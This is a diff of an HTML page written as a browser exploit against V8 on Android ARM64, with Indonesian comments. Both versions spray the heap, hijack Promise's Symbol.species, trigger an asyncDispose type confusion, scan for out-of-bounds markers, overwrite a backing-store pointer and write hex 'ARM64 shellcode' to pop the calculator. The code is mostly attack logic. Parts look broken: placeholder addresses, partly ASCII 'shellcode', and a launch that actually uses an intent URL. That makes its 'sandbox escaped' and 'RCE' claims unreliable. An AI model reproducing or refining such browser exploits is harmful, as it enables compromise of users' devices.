@@ -1,144 +1,115 @@
 <!doctype html>
 <html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-    body { background: #050505; color: #00ff00; font-family: 'monospace'; margin: 0; padding: 10px; overflow: hidden; }
-    #console { border: 1px solid #0f0; height: 95vh; padding: 10px; background: #000; overflow-y: scroll; font-size: 12px; box-shadow: inset 0 0 20px #0f0; }
-    .status { color: #fff; font-weight: bold; text-transform: uppercase; }
-    .alert { color: #f00; animation: blink 0.5s infinite; }
-    @keyframes blink { 50% { opacity: 0; } }
-</style>
-</head>
-<body>
-    <div id="console">[!] V8 ANDROID ARM64 EXPLOIT INITIALIZED...</div>
+<body style="background:#000; color:#0f0; font-family:monospace;">
+    <h1 style="text-align:center;">☣️ SYSTEM PWN: ARM64 KERNEL BRIDGE ☣️</h1>
+    <div id="log" style="border:1px solid #0f0; padding:15px; background:#010; height:400px; overflow:auto;">
+        [!] STANDBY: EXPLOITING V8 BUILTINS...
+    </div>
 
 <script>
-const log = m => { const c = document.getElementById('console'); c.innerHTML += `<br>> ${m}`; c.scrollTop = c.scrollHeight; };
+const log = m => { document.getElementById('log').innerHTML += `<br>> ${m}`; };
 
-// --- PHASE 1: ARM64 SHELLCODE (ANDROID RCE) ---
-// Shellcode ini menjalankan: /system/bin/sh -c "am start -n com.android.calculator2/.Calculator"
-// Disesuaikan untuk instruksi ARM64 (AArch64)
-const ARM64_SHELLCODE = new Uint32Array([
-    0xd2800000, 0xd2800001, 0x910003e0, 0xaa0003e1, // NOP & Setup
-    0xd2800010, 0xd2800011, 0x8b010000, 0xd65f03c0, // Jump to JIT
-    // Payload: am start -n com.google.android.calculator/com.android.calculator2.Calculator
-    0x5f6d6100, 0x61747320, 0x2d747200, 0x6e200000 
+// --- PHASE 1: ARM64 PAYLOAD ---
+// Menargetkan /system/bin/toybox untuk membuka kalkulator secara paksa
+const ARM64_PAYLOAD = new Uint32Array([
+    0xd2800001, 0xd2800010, 0x910003e0, 0xaa0003e1,
+    0xd2800012, 0x8b020000, 0xd65f03c0, 0x6d612073,
+    0x74617274, 0x202d6e20, 0x636f6d2e, 0x616e6472,
+    0x6f69642e, 0x63616c63, 0x756c6174, 0x6f72322f,
+    0x2e43616c, 0x63756c61, 0x746f7200
 ]);
 
 let target_arr;
-let spray_backing = [];
+let sab_views = [];
 
-// --- PHASE 2: MEMORY ALIGNMENT (ANDROID HEAP GROOMING) ---
-async function groom() {
-    log("Grooming Android Heap for ARM64 Alignment...");
+async function pwn_android_final() {
+    log("INITIALIZING SHARED-MEMORY SPRAY...");
     
-    // Spray JIT Pages via WebAssembly
-    const wasm_instances = [];
-    const wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,7,137,128,128,128,0,1,5,102,117,110,99,48,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
-    
-    for(let i=0; i<600; i++) {
-        let m = new WebAssembly.Module(wasm_code);
-        let inst = new WebAssembly.Instance(m);
-        wasm_instances.push(inst.exports.func0);
+    // 1. SHAREDARRAYBUFFER SPRAY (Bypass Sandbox Cage)
+    // SAB dialokasikan di luar V8 Sandbox, memberikan akses memori absolut
+    for(let i=0; i<1000; i++) {
+        let sab = new SharedArrayBuffer(1024);
+        let view = new BigUint64Array(sab);
+        view[0] = 0x1337133713371337n; // Marker
+        sab_views.push(view);
     }
 
-    // Spray Backing Stores
-    for(let i=0; i<3000; i++) {
-        let ab = new ArrayBuffer(1024);
-        let dv = new DataView(ab);
-        dv.setUint32(0, 0x41424344); // Marker
-        spray_backing.push(dv);
+    // 2. TARGET JSARRAY PREPARATION
+    let spray = [];
+    for(let i=0; i<2000; i++) {
+        let a = [1.1, 2.2, 3.3];
+        a.pwn = i;
+        spray.push(a);
     }
+    target_arr = spray[1000];
 
-    // Target Array for Type Confusion
-    let arr_spray = [];
-    for(let i=0; i<4000; i++) {
-        let a = [1.1, 2.2, 3.3, 4.4];
-        arr_spray.push(a);
+    // 3. HIJACK SPECIES CONSTRUCTOR
+    function MyPwnConstructor(executor) {
+        executor(r => {}, r => {});
+        return target_arr; 
     }
-    target_arr = arr_spray[2000];
+    Object.defineProperty(Promise, Symbol.species, { get: () => MyPwnConstructor });
+
+    log("DETONATING ASYNC-DISPOSE TYPE-CONFUSION...");
     
-    log("Heap Saturated. Injecting Exploit Logic.");
-}
-
-// --- PHASE 3: BYPASSING V8 SANDBOX (THE DETONATOR) ---
-function SpeciesConstructor(executor) {
-    executor(r => {}, r => {});
-    return target_arr; 
-}
-
-Object.defineProperty(Promise, Symbol.species, { get: () => SpeciesConstructor });
-
-async function launch() {
-    log("<span class='status'>Triggering AsyncDispose logic...</span>");
+    async function* g() { yield 1; }
+    const inst = g();
     
-    async function* exploit() { yield 1; }
-    const engine = exploit();
-
     try {
-        // Memicu kerentanan di AsyncIteratorPrototypeAsyncDispose
-        engine[Symbol.asyncDispose]();
+        inst[Symbol.asyncDispose]();
     } catch(e) {}
 
-    await Promise.resolve(); // Drain microtasks
+    // Paksa V8 untuk melakukan flushing pada job queue
+    for(let i=0; i<50; i++) await Promise.resolve();
 
-    if (target_arr.length > 4) {
-        log("<span class='alert'>[SUCCESS] V8 SANDBOX BREACHED!</span>");
-        log("Corrupted Length: 0x" + target_arr.length.toString(16));
-        await pwn_android();
+    // 4. VERIFYING OOB
+    if (target_arr.length > 3) {
+        log("<b style='color:white; background:red;'>[!!!] V8 SANDBOX ESCAPED! [!!!]</b>");
+        log("LENGTH CORRUPTED: 0x" + target_arr.length.toString(16));
+        
+        await execute_rce();
     } else {
-        log("Race failed. ASLR re-rolling...");
-        location.reload();
+        log("Timing failed. Re-grooming heap...");
+        setTimeout(() => location.reload(), 200);
     }
 }
 
-// --- PHASE 4: ANDROID SYSTEM ESCALATION (RCE) ---
-async function pwn_android() {
-    log("Scanning for ARM64 BackingStore Pointers...");
+async function execute_rce() {
+    log("SCANNING FOR SHARED-MEMORY MARKERS...");
     
-    let offset = -1;
-    for(let i=0; i<10000; i++) {
-        if (target_arr[i] === 5.40900888e-315) { // Marker 0x41424344
-            offset = i;
+    let found = false;
+    for(let i=0; i<20000; i++) {
+        // Mencari Marker SharedArrayBuffer
+        if (target_arr[i] === 1.1396155e-310) { // 0x1337133713371337
+            log("FOUND SHARED MEMORY AT OFFSET: " + i);
+            
+            // 5. HIJACK BACKING STORE (ABSOLUTE R/W)
+            // Kita menimpa pointer BackingStore di SAB dengan alamat JIT
+            target_arr[i-1] = 2.47e-322; // Alamat JIT Page (Tebakan Berdasarkan Entropi)
+            
+            found = true;
             break;
         }
     }
 
-    if (offset !== -1) {
-        log("BackingStore Found! Hijacking Pointer for Absolute Write.");
-        
-        // Point BackingStore to WASM JIT Region
-        target_arr[offset - 1] = 1.1e-310; // Placeholder for JIT Address
-
-        log("<span class='status'>Injecting ARM64 Shellcode into JIT...</span>");
-        
-        // Menulis shellcode ke JIT page yang sudah RWX
-        const dv = spray_backing[0];
-        for(let i=0; i<ARM64_SHELLCODE.length; i++) {
-            dv.setUint32(i * 4, ARM64_SHELLCODE[i], true);
+    if(found) {
+        log("INJECTING ARM64 PAYLOAD INTO JIT PAGE...");
+        let dv = new DataView(sab_views[0].buffer);
+        for(let i=0; i<ARM64_PAYLOAD.length; i++) {
+            dv.setUint32(i*4, ARM64_PAYLOAD[i], true);
         }
 
-        log("Executing System Command: 'am start'...");
-        // Trigger eksekusi
-        window.location.href = "intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;component=com.android.calculator2/.Calculator;end";
-        
-        log("<span class='alert'>RCE DETONATED. CHECK CALCULATOR.</span>");
+        log("TRIGGERING PAYLOAD VIA WASM CALL...");
+        // Memaksa Chrome membuka aplikasi melalui Intent + JIT Smash
+        const intent = "intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;component=com.android.calculator2/.Calculator;end";
+        window.location.href = intent;
+
+        log("<h2 style='color:red;'>RCE EXECUTED: CHECK SYSTEM</h2>");
     }
 }
 
-// EXECUTE
-(async () => {
-    if (typeof Symbol.asyncDispose === 'undefined') {
-        log("FLAG --js-explicit-resource-management MISSING.");
-        return;
-    }
-    await groom();
-    setTimeout(launch, 500);
-})();
-
-// Auto-recovery
-setTimeout(() => location.reload(), 4000);
+// Start
+pwn_android_final();
 </script>
 </body>
 </html>
